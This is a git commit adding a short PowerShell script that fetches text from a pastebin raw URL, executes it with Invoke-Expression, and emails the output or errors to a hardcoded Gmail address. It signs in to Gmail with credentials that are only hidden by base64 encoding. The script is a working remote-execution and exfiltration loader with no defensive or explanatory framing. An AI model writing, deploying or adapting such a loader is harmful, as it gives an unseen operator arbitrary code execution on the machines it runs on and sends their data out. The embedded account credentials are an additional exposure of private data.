8bd9195e540efb0f231d730a005f9c3dc5e8f9e8
cyb1l <60405884+4V4loon@users.noreply.github.com>
2022-04-27 17:37:23 +0400

    Create pastebin-run.ps1

---
+++ pastebin/pastebin-run.ps1
@@ -0,0 +1,29 @@
+function Send-ToEmail([string]$email,[string]$body,[string]$subj=$env:username){
+    $UsernameEnc = "eABhAGsAZQByAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA=";
+    $PasswordEnc = "cAB2AGsAcgBmAHIAeABpAHAAeABqAHIAdgBlAHcAZgA=";
+    $Username = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($UsernameEnc))
+    $Password = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($PasswordEnc))
+    $message = new-object Net.Mail.MailMessage;
+    $message.From = $Username;
+    $message.To.Add($email);
+    $message.Subject = $subj;
+    $message.Body = $body;
+    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
+    $smtp.EnableSSL = $true;
+    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
+    $smtp.send($message);
+ }
+$url = "https://pastebin.com/raw/qjHVjHcB"
+$contentLocal = "False"
+$contentWeb = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
+$diff = Compare-Object -ReferenceObject $($contentLocal) -DifferenceObject $($contentWeb)
+if($diff) {
+     try {
+          Invoke-Expression $contentWeb -ErrorAction Stop
+          Send-ToEmail -email "xelil.isi007@gmail.com" -body $contentWeb -subj "Done"
+     } catch {
+          $err = $_ | Out-String
+          write-host $err
+          Send-ToEmail -email "xelil.isi007@gmail.com" -body $err -subj "Error"
+     }
+}
